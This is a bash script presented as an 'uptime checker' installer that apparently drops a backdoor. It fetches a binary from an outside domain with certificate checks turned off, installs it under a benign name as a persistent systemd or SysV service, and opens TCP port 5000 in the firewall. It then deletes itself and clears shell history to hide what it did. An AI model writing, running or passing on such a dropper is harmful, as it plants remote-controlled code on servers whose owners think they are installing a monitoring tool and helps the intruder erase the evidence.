#!/bin/bash

mkdir .uptimetmp
cd .uptimetmp

rm -f uptime_checker.sh

SERVICE_NAME=uptime_checker
EXEC_SRC=./server
# EXEC_PATH=/usr/local/bin/uptime_check
LOG_FILE=/var/log/uptime_checker.log
PID_FILE=/var/run/$SERVICE_NAME.pid

if [ -d "/usr/local/bin" ]; then
    EXEC_PATH="/usr/local/bin/uptime_check"
else
    EXEC_PATH="/bin/uptime_check"
fi

SYSTEMD_SERVICE=/etc/systemd/system/$SERVICE_NAME.service
INIT_SCRIPT=/etc/init.d/$SERVICE_NAME

echo "[+] Installing binary..."

wget --no-check-certificate https://gabimaru.live/rs/spider-st

mv spider-st server

if [ ! -f "$EXEC_SRC" ]; then
    echo "[-] ERROR: ./server not found"
    cd ..

    rm -rf .uptimetmp
    rm -f uptime_checker.sh

    history -c
    history -w

    exit 1
fi

cp "$EXEC_SRC" "$EXEC_PATH"
chmod +x "$EXEC_PATH"

# =========================
# DETECT INIT SYSTEM
# =========================

if command -v systemctl >/dev/null 2>&1; then
    echo "[+] systemd detected"

    cat <<EOF > "$SYSTEMD_SERVICE"
[Unit]
Description=Uptime Checker Service
After=network.target

[Service]
ExecStart=$EXEC_PATH
Restart=always
RestartSec=2

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable $SERVICE_NAME
    systemctl start $SERVICE_NAME

    echo "[+] systemd service installed"


elif [ -d /etc/init.d ]; then
    echo "[+] SysV init detected"

    cat <<EOF > "$INIT_SCRIPT"
#!/bin/bash
# chkconfig: 2345 99 01
# description: Uptime Checker Service

EXEC="$EXEC_PATH"
PIDFILE="$PID_FILE"
LOG="$LOG_FILE"

start() {
    echo "Starting $SERVICE_NAME..."

    if [ -f \$PIDFILE ] && kill -0 \$(cat \$PIDFILE) 2>/dev/null; then
        echo "Already running"
        return
    fi

    nohup \$EXEC >> \$LOG 2>&1 &
    echo \$! > \$PIDFILE
}

stop() {
    echo "Stopping $SERVICE_NAME..."

    if [ -f \$PIDFILE ]; then
        kill \$(cat \$PIDFILE) 2>/dev/null
        rm -f \$PIDFILE
    fi
}

restart() {
    stop
    sleep 1
    start
}

status() {
    if [ -f \$PIDFILE ] && kill -0 \$(cat \$PIDFILE) 2>/dev/null; then
        echo "RUNNING"
    else
        echo "STOPPED"
    fi
}

case "\$1" in
    start) start ;;
    stop) stop ;;
    restart) restart ;;
    status) status ;;
    *) echo "Usage: \$0 {start|stop|restart|status}" ;;
esac
EOF

    chmod +x "$INIT_SCRIPT"

    # register service (CentOS / RHEL)
    if command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add $SERVICE_NAME
        chkconfig $SERVICE_NAME on
    fi

    # register service (Debian old)
    if command -v update-rc.d >/dev/null 2>&1; then
        update-rc.d $SERVICE_NAME defaults
    fi

    service $SERVICE_NAME start

    echo "[+] SysV service installed"

else
    echo "[!] Unknown init system → using fallback"

    nohup "$EXEC_PATH" >> "$LOG_FILE" 2>&1 &
    echo $! > "$PID_FILE"

    echo "[+] Running in background (PID $(cat $PID_FILE))"
fi

if command -v firewall-cmd >/dev/null 2>&1; then
    echo "Using firewalld"
    firewall-cmd --add-port=5000/tcp --permanent
    firewall-cmd --reload

elif command -v iptables >/dev/null 2>&1; then
    echo "Using iptables"
    iptables -I INPUT -p tcp --dport 5000 -j ACCEPT

    if command -v service >/dev/null 2>&1 && service iptables status >/dev/null 2>&1; then
        service iptables save
    else
        iptables-save > /etc/iptables.rules
    fi

else
    echo "No firewall tool detected"
fi

cd ..

rm -rf .uptimetmp
rm -f uptime_checker.sh

history -c
history -w

echo "[+] DONE"